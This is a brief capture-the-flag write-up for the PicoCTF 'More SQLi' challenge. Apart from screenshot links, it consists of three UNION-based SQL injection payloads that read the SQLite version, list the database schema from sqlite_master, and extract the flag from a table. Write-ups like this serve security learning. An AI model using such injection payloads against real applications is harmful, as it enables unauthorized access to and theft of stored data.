# More SQLi (PicoCTF)

`https://play.picoctf.org/practice/challenge/358`

```
Author: Mubarak Mikail
Description
Can you find the flag on this website. Try to find the flag here.
```

![alt text](assets/more1.png)

![alt text](assets/more2.png)

![alt text](assets/more3.png)

Payload:

`' UNION SELECT 1, sqlite_version(), 3;--`

![alt text](assets/more4.png)

Payload:

`' UNION SELECT name, sql, null from sqlite_master;--`

![alt text](assets/more5.png)

Flag payload:

`' UNION SELECT flag, null, null from more_table;--`

![alt text](assets/more6.png)

